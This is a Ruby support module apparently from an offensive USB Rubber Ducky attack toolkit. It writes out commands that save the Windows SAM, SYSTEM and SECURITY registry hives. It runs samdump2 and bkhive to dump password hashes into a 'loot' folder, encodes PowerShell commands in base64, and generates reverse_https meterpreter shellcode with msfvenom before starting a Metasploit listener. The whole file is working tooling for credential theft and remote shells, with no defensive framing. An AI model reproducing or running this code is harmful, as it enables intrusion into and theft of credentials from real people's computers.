#!/usr/bin/env ruby
require 'base64'
require 'openssl'
require 'fileutils'
require 'open3'
module MainCommands
  def print_error(text)
    print "\e[31;1m[-]\e[0m #{text}"
  end
  def print_info(text)
    print "\e[34;1m[*]\e[0m #{text}"
  end
  def print_success(text)
    print "\e[32;1m[+]\e[0m #{text}"
  end
  def get_input(text)
    print "\e[33;1m[!]\e[0m #{text}"
  end
  def file_root
    File.expand_path(File.dirname($0))
  end
  def text_path
    Dir.mkdir(file_root + '/text_files/') if not Dir.exists?(file_root + '/text_files/')
    file_root + '/text_files/'
  end
  def duck_encode_file
    file_root + '/duck_encoder/'
  end
  def language_dir
    duck_encode_file + '/resources/'
  end
  def loot_dir
    file_root + '/loot/'
  end
  def reverse_meterpreter_file
    'powershell_reverse_ducky.txt'
  end
  def fast_meterpreter_file
    'fast_meterpreter_ducky.txt'
  end
  def hash_dump_file
    'hashdump_tcp.txt'
  end
  def lsass_dump_file
    'lsassdump_tcp.txt'
  end
  def wifi_dump_file
    'wifidump_tcp.txt'
  end
  def wget_file
    'wget_powershell.txt'
  end
  def hex_to_bin_file
    'hex_to_bin.txt'
  end
  def reg_folder
    'c:\\windows\\temp\\reg\\'
  end
  def cert_dir
    file_root + '/certs/'
  end
  def save_sam
    "reg.exe save HKLM\\SAM #{reg_folder}sam"
  end
  def save_sys
    "reg.exe save HKLM\\SYSTEM #{reg_folder}sys"
  end
  def save_sec
    "reg.exe save HKLM\\SECURITY #{reg_folder}sec"
  end
  def victim_path
    'c:\\windows\\temp'
  end
  def temp_path
    'c:\\windows\\temp\\test.txt'
  end
  def print_hashes(x)
    #cache_path, cache_status = Open3.capture2('which cachedump')
    samdump_path, samdump_status = Open3.capture2('which samdump2')
    bkhive_path, bkhive_status = Open3.capture2('which bkhive')
    #print_error("Can't find cachedump!\n") if cache_status.to_s =~ /exit 1/
    print_error("Can't find samdump2!\n") if samdump_status.to_s =~ /exit 1/
    print_error("Can't find bkhive!\n") if bkhive_status.to_s =~ /exit 1/
    if samdump_status.to_s =~ /exit 0/ and bkhive_status.to_s =~ /exit 0/
      Open3.capture2("#{bkhive_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sys_key#{x}.txt")
      sam_dump,sam_exit = Open3.capture2("#{samdump_path.chomp} #{loot_dir}sam#{x} #{loot_dir}sys_key#{x}.txt")
      print_success("Printing Hashes!\n")
      puts sam_dump
      File.open("#{loot_dir}hashes#{x}.txt",'w') {|f| f.write(sam_dump)}
    else
      print_error("Can't dump local hashes!\n")
    end
    #if cache_status =~ /exit 0/
    #  cache_domain = Open3.capture2("#{cache_path.chomp} #{loot_dir}sys#{x} #{loot_dir}sec#{x}")
    #  print_success("Printing Domain Chached Creds!\n")
    #  puts cache_domain
    #  File.open("#{loot_dir}domain_hashes#{x}.txt",'w') {|f| f.write(cache_domain)}
    #else
    #  print_error("Can't Dump Domain Cached Creds!\n")
    #end
  end
  def encode_command(command)
    Base64.encode64(command.encode('utf-16le')).delete("\r\n")
  end
  def random_name_gen
    random_length = rand(4..8)
    file_name = random_length.to_i.times.map {[*'a'..'z',*'A'..'Z',*'0'..'9'].sample}.join
    return file_name
  end
  def hex_to_bin(file_name,hex_string)
    File.open(file_name,'w') {|f| f.write(hex_string.scan(/../).map { |x| x.hex }.pack('c*'))}
  end
  def bin_to_hex(file)
    bin_file = File.open(file, 'rb').read
    bin_file.unpack('H*').first
  end
  def ssl_setup(host, port)
    tcp_server = TCPServer.new(host,port)
    ctx = OpenSSL::SSL::SSLContext.new
    ctx.cert = OpenSSL::X509::Certificate.new(File.open("#{cert_dir}server.crt"))
    ctx.key = OpenSSL::PKey::RSA.new(File.open("#{cert_dir}server.key"))
    server = OpenSSL::SSL::SSLServer.new tcp_server, ctx
    return server
  end
end
module MsfCommands
  def generate_shellcode(host,port)
    if File.exist?('/usr/bin/msfvenom')
      @msf_path = '/usr/bin/'
    elsif File.exist?('/opt/metasploit-framework/msfvenom')
      @msf_path = ('/opt/metasploit-framework/')
    else
      print_error('Metasploit Not Found!')
      exit
    end
    #@set_payload = 'windows/x64/meterpreter/reverse_tcp'
    @set_payload = 'windows/meterpreter/reverse_https'
    print_info("Generating shellcode\n")
    execute  = `#{@msf_path}./msfvenom --payload #{@set_payload} LHOST=#{host} LPORT=#{port} C`
    print_success("Shellcode Generated\n")
    shellcode = clean_shellcode(execute)
    return shellcode
  end
  def clean_shellcode(shellcode)
    shellcode = shellcode.gsub('\\', ',0')
    shellcode = shellcode.delete('+')
    shellcode = shellcode.delete('"')
    shellcode = shellcode.delete("\n")
    shellcode = shellcode.delete("\s")
    shellcode[0..4] = ''
    return shellcode
  end
  def metasploit_setup(host,port)
    Dir.mkdir(file_root + '/metaspoit_files/') if not Dir.exists?(file_root + '/metaspoit_files/')
    file_path = file_root + '/metaspoit_files/'
    rc_file = 'msf_listener.rc'
    print_info("Setting up Metasploit this may take a moment\n")
    file = File.open("#{file_path}#{rc_file}",'w')
    file.write("use exploit/multi/handler\n")
    file.write("set PAYLOAD #{@set_payload}\n")
    file.write("set LHOST #{host}\n")
    file.write("set LPORT #{port}\n")
    file.write("set EnableStageEncoding true\n")
    file.write("set ExitOnSession false\n")
    file.write('exploit -j')
    file.close
    system("#{@msf_path}./msfconsole -r #{file_path}#{rc_file}")
  end
end
